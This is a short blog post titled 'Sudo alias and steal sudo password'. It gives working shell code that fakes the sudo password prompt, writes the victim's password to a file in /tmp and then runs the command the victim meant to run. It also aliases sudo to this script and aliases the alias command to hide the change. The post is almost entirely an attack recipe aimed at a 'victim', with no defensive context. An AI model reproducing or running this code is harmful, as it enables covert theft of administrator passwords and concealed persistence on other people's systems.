---
layout: post
title:  "Sudo alias and steal sudo password"
categories: ssh password
summary: Use alias to steal sudo password
---

{% include instructions.md %}

### {{page.title}}

This needs permanent solution to add alias and better way to do cut
Create file that asks sudo password, runs the last command and steals the password and adds it to a file

```shell
# nano /bin/admin
read -s -p "[sudo] password for $(whoami): "  password
echo
echo $password >> /tmp/sudo_password.txt
echo $password | /usr/bin/sudo -S $(history 1 | cut -c 13-)  
```

Give execute permissions to that file and give the script to sudo alias
```shell
# chmod +rx /bin/admin
# alias sudo="/bin/admin"
```

Now every time victim is running sudo [command] script asks password, steals the password and runs the command what victim wanted to run.

After this we can hide this alias modification by modifying the alias command
```shell
# alias > /bin/alias_old
# alias alias="cat /bin/alias_old"
```